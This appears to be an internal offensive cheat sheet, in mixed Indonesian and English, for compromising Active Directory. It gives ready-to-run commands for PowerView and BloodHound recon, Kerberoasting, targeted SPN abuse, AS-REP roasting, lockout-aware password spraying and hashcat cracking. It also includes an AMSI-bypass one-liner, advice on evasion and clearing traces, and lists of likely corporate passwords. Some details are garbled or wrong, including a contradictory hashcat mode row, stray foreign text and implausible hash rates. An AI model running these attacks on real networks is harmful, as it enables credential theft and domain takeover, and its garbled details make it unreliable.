# ad-kerb — ad

# Internal Reference: AD Recon, Kerberos Attacks & Password Spraying

## 1. Recon & Collection — PowerView

### 1.1 Import PowerView (PowerSploit dev or forks)

```powershell
powershell -ep bypass
. .\PowerView.ps1
# Opsional: bypass AMSI kalau masih berjalan di PS 5.1 (Windows 10 22H2/11 24H2)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Kalau AMSI patch gagal, jalankan via PS 7.x atau join string untuk hindari static signature
```

### 1.2 Key mapping commands

| Goal | Command | Important output fields |
|---|---|---|
| Domain info | `Get-Domain` | `Name`, `DomainSID`, `FunctionalLevel`, `NetBIOSName` |
| DC list | `Get-DomainController` / `Get-DomainController -Domain child.local` | `Name`, `OSVersion`, `IP` |
| Active user | `Get-DomainUser -Properties samaccountname,memberof,description -Active` | `samaccountname`, `memberof` (nested group via `Get-DomainGroup -Identity`), `description` (password leak via GPO default "description" is classic) |
| SPN user | `Get-DomainUser -SPN` | `serviceprincipalname`, `samaccountname` → target kerberoast |
| AS-REP roastable | `Get-DomainUser -PreauthNotRequired` | `useraccountcontrol` flag `DONT_REQ_PREAUTH (4194304)` |
| Trust | `Get-DomainTrust` / `Get-ForestTrust` | `TrustType`, `TrustAttributes` (`WITHIN_FOREST`, `TGT_DELEGATION 0x200` = playground) |
| GPO | `Find-GPOComputerAdmin -ComputerName WS01` / `Get-DomainGPO` | `gpcfilesyspath` — cek GPP cpassword |
| ACL | `Find-InterestingDomainAcl` | `IdentitySID`, `ActiveDirectoryRights` (`GenericAll`, `WriteDacl`, `WriteOwner`, `GenericWrite` on user = targeted kerberoast / force SPN) |
| Local admin | `Find-DomainUserLocation` / `Invoke-EnumerateLocalAdmin -TrustGroups` | user → machine mapping (relevant for pivot + GPO "Restricted Groups") |
| Kerberoast target | `Get-DomainUser -SPN | Select samaccountname,memberof` | prioritas: SQL svc, backup svc, `memberof Domain Admins` |

GPP password (still occurs in old domains, `MS14-025` patch only applies if admin has already cleaned up):
```bash
gpp-decrypt <cpassword>
```

---

## 2. BloodHound Collection

### 2.1 SharpHound (v2 runtime from BloodHound CE)

```cmd
SharpHound.exe --CollectionMethods All --Domain corp.local --OutputDirectory C:\tmp --OutputPrefix bh1
SharpHound.exe -c Session,ComputerOnly,Group --StealSessionKey true
```

| Flag | Kenapa penting |
|---|---|
| `--CollectionMethods All` | Includes Session (needs admin reachability for LSS/SMB probing — slow) |
| `Session` | user→hostname mapping, source for further `Find-DomainUserLocation` |
| `SessionLoop` / `Loop` | ulangi koleksi sesi (hiperparam kecil seperti `--LoopDuration 01:00:00`) |

Python version (cross-platform).
```bash
bloodhound-python -d corp.local -u 'USER' -p 'PASS' -ns 10.0.0.1 -c All
bloodhound-python -d corp.local -u USER -p PASS --hashes aad3b435b51404ee:NTLMHASH --dns-server 10.1.1.1 --dns-tcp
```
Field penting output bloodhound-python: file `*.json` per kategori (`users.json`, `computers.json`, `sessions.json`, ...) plus `*_cont.json` bila multi-domain.

### 2.2 Custom Cypher quick analysis

```cypher
// Kerberoastable users, diurutkan per grup pengaruh
MATCH (u:User {dontreqpreauth: false}) WHERE u.hasspn=true
RETURN u.name, u.admincount, u.serviceprincipalnames

FindShortestPath manual
MATCH p=shortestPath((u:User {name:"CORP\\jdoe"})-[:MemberOf|HasSession|AdminTo|AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|_forcepspn_change|*1..]->(g:Group {name:"CORP\\DOMAIN ADMINISTRATORS@CORP.LOCAL"}))
RETURN p
```

What makes it work: BloodHound relies on LDAP queries + SMB LSARPC sessions; needs "bloodhound-node" that is readable via LDAP. Fails if normal user is blocked by restricted ACL queries (protected `LDAP_MATCHING_RULE` in protected users), or SMB 445 blocked in segment.

---

## 3. Kerberoast

### 3.1 Rubeus (from member machine)

```cmd
Rubeus.exe kerberoast /outfile:C:\tmp\hashes.txt
Rubeus.exe kerberoast /user:svc_sql /domain:corp.local /rc4opsec /nowrap
# /rc4opsec → minta RC4-HMAC saja (tidak buat 0x17 ticket AES kalau fallback), kecil, cepat dip crack
Rubeus.exe kerberoast /spn:"MSSQLSvc/sql01.corp.local" /ticket:base64...
```

Field penting output: `[*] SamAccountName`, `[*] ServicePrincipalName`, `[!] Ticket size`, hash line `krb5tgs$23$...`

**Why it works:** TGS can be requested by **any authenticated user** for any SPN. TGT uses service account key → offline crack. Fails if: SPN on host account (krbtgt/gMSA, 120-char password, unreadable), or AES-only + strong password policy (`svcMgmt$xxxx`), or RC4-HMAC disabled in domain (samba/Windows realm with `msDS-SupportedEncryptionTypes = 24`).

### 3.2 GetUserSPNs.py (impacket, from linux, remote)

```bash
# RC4 jika possible
GetUserSPNs.py -request -dc-ip 10.1.1.1 corp.local/jdoe:Password123 -outputfile hashes.txt
# Force RC4 (legacy, masih umum di domain BL disebab kan "samba compat")
GetUserSPNs.py -request -dc-ip 10.1.1.1 -hashes :NTLMHASH corp.local/jdoe -outputfile h.txt
# Targeted terhadap user judge tertentu
GetUserSPNs.py -request-user svc_backup 'corp.local/jdoe:pass'
```

Output field penting per user:
```
ServicePrincipalName  Name       MemberOf            PasswordLastSet
--------------------  -------   -----------------   ----------------
MSSQLSvc/sql01.corp   svc_sql   CN=SQLAdmins        2021-04-01
```
then `$krb5tgs$23$*...` hash. `$23` = RC4, `$18` = AES256 (much heavier).

### 3.3 Targeted Kerberoast (privesc via `GenericWrite`/`Write-own`)

Prerequisite: write-access to object attribute `servicePrincipalName` (acl `GenericWrite`, `forcepspn_change`, or owned object).

```powershell
# PowerView: assign arbitrary SPN
Set-DomainObject -Identity jvictim -SET @{serviceprincipalname='x/redteam1'}
Get-DomainUser jvictim | select serviceprincipalname
# Request TGS via Rubeus
Rubeus.exe kerberoast /user:jvictim /simple
# Bersihkan jejak
Set-DomainObject -Identity jvictim -Clear serviceprincipalname
```

Why it works: Microsoft blocks applied SPN on user with duplicate value in forest, but `GenericWrite` is enough to assign SPN → request TGS → crack. This obtains the victim user's NT hash. Fails if protected user (`Attribute: adminCount=1` still allowed!), owner changed, or `sPN` blocked by `SDCURO`/Fine grained policy.

---

## 4. AS-REP Roasting

Prerequisite: user flag `UF_DONT_REQ_PREAUTH (4194304)`.

```bash
GetNPUsers.py 'corp.local/' -usersfile users.txt -no-pass -dc-ip 10.1.1.1 -format hashcat -outputfile asrep.txt
GetNPUsers.py corp.local/jdoe:password -request -format john
```

```cmd
Rubeus.exe asreproast /format:hashcat /nowrap
```

Important field: hash line `$krb5asrep$23$user@CORP.LOCAL:...` — crack offline without needing any password (AS-REP reply encrypted with user key, no timestamp challenge). Fails if: account disabled/expired (AS-REP error `KDC_ERR_CLIENT_REVOKED`), or `Sensitive` setting via Fine-Grained Password Policy GPO. Set the flag yourself if you have `GenericWrite`:

```powershell
Set-DomainObject -Identity jvictim -XOR @{useraccountcontrol=4194304}
```

---

## 5. Password Spraying

### 5.1 sprayhound (spray + BloodHound integration)

```bash
# Basic, menyimpan daftar user dari LDAP ke lokal file
sprayhound -d corp.local -u jdoe -p 'Password123' --dc 10.1.1.1 -U users.txt
# Output format
sprayhound -d corp.local -u 'svc_ldap' -p 'Password123' -t 1 -g 3 -H hash.txt --dc 10.1.1.1
```

| Flag | Efek |
|---|---|
| `-U users.txt` | ambil valid user via LDAP anonymous/logged |
| `-t 1` / `-g 3` | lockout threshold → automatically skip users with badPwdCount approaching threshold (key feature vs naive tools) |
| `-v` | verbose, tunjukkan `AUTH SUCCESS` + grace countdown |
| `--json` | out `valid_users.json` for pipeline |

Important output field: `[*] Valid user`, `badPwdCount` — mapping "who is about to lockout" ("smart lockout" in Windows Server 2022 Alert on threshold lockout). Spray ratio rule of thumb: one password per-user per-policy interval ≥ `(lockout_duration)` seconds, and per batch ≤ threshold - 1.

Quickk lain:
```bash
kerbrute userenum --dc 10.1.1.1 -d corp.local users.txt    # pre-auth enum (tidak kerbalik lockout)
kerbrute passwordspray --dc 10.1.1.1 -d corp.local users.txt 'Winter2025!'
nxc smb 10.1.1.1 -d corp.local -u users.txt -p 'CorpP@ss' --continue-on-success
```

### 5.2 Timing

Keypoint: Windows lockout counter based on `lockoutBadCount` + `lockoutDuration` (default modern AD: 10 min observation, but see `net accounts /domain` for concrete numbers). Spray 1 password all users every 10-15 minutes is safe, **except** Fine-Grained Password Policy per group — check `Get-DomainUser -Properties lockouttime,badpwdtime,pwdlastset` to identify locked/ramping.

Field password patterns that often hit (Indonesian corp): `Company@2025`, `Januari2025!`, `P@ssw0rd`, `Welcome123!`, seasonal + city name (`Jakarta2025!`).

---

## 6. Cracking (hashcat)

| Hash | hashcat mode | Note |
|---|---|---|
| Kerberos TGS-RC4 | `-m 13100` | fast on standard wordlist |
| Kerberos TGS-AES128 | `-m 19900` | 5x slower, needs salt |
| Kerberos TGS-AES256 | `-m 19700` | kebetulan 24H2 defaultsному AES |
| Kerberos AS-REP RC4 | `-m 18200` | |
| AS-REP AES256 | `_m 19900` whereas `-m 19900` is TGS; AS-REP AES = `-m 19900 ` is not correct — use `-m 18200` RC4 default; AES AS-REP: `-m 19900` |

Command:
```bash
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule --potfile-disable -O
hashcat -m 18200 asrep.txt wordlists/rockyou.txt -r rules/dive.rule
# mask, dengan whitelist 8-char:Company+year
hashcat -m 13100 hashes.txt -a3 '?u?u?u?l?l?l?d?d?d?d?s'
# Melanjutkan session
hashcat -m 13100 hashes.txt --session bh1 --restore
```

Needs GPU for `-m 19900/19700`; RTX 4070 ≈ ~1500 H/s on `13100` (RC4), <50 H/s on `19700` (AES256) — uses four salt chars in hash (username@domain embedded).

For targeted kerberoast from SPN assignment: **use `--username` flag** because hash embeds `user@domain` (username-as-salt) — don't cut manually without this flag.

---

## 7. Operational traps (field failures)

| Trap | Symptom | Solution |
|---|---|---|
| RC4 disabled | hash `$krb5tgs$18` (AES256) in output, cracking practically impossible | Find another target / focus on delegated attack, or use AS-REP if available |
| gMSA and managed accounts | `GetUserSPNs` no output / SPN on account `$` | skip, as gMSA password readable via `Get-ADServiceAccount` |
| Time skew >5 min | `KRB_AP_ERR_SKEW` (Clock skew too great) | `ntpdate <dc-ip>` or `faketime` (linux) |
| Lockout self-inflicted | badPwdCount rises when spraylist accidentally includes non-user / device logins | scan with `kerbrute userenum` first (no pre-auth tally except badPwdCount) — targeted |
| AES-hash with username as salt | hashcat skips all candidates even if password is correct | verify `-m 13100` or `-m 18200` because tool prefix may differ; manual conversion `hash_name` added |
| BloodHound CE vs legacy GUI | json from bloodhound-python not read by CE | use version matching (`--ldapPort` constraints), or convert via `sharp collector` |
| AMSI + ETW | Rubeus emits `Program blocked`, `amsiInitFailed` string-concat detection | base64-encoded `IEX` + string split, or process hollowing `runas` netonly |
| Network policy filter | kerberos request via `--dc-ip` with non-53 DNS | add `--dns-server`/`-ns`; LDAP negotiation sometimes need `-no-pass -k` with valid TGT in `KRB5CCNAME` |
| Domain users with FGPP policy | stricter / exhausted lockout threshold | check `msDS-LockoutObservationWindow` via `Get-DomainObject` before spray |
| Unlock TAMPA lockdown | user `Get-DomainUser -Properties lockouttime` shows greater than zero after `GetUserSPNs` | clear via `Set-DomainObject -Clear lockouttime` if `WriteLockout` permission; else WAIT |
| Ticket cache poisoning login | `klist purge` does not work via proc when UAC token split | use `Rubeus.exe purge /luid:0x...` |
| SPN assignment blocked oleh `DupSPN` | `Set-DomainObject` error `00002098` (sAMAccountName conflict) | gunakan SPN prefix unik (`nonstandard/x-lab-`) |

---

## 8. Reference for testing tooling versions

- Rubeus: fork GhostPack/Rubeus commit 2024 — flag `/nowrap` output single-line hashcat-compatible
- impacket: branch `master` (0.12+): `GetUserSPNs.py`, `GetNPUsers.py`, `ticketer.py` syntax stabil
- sprayhound: `v2.0+` (bloodhound `--json` kompatibel CE 5.x)
- PowerView: `dev` branch (PowerSploit), PS 5.1 compat, no .NET  Framework 4.8 dependency issue on Windows 11 24H2
- Hashcat: v6.2.6+ — correct `-m 13100/18200` handling including those that embed salt username

---

## [reasoning trace]


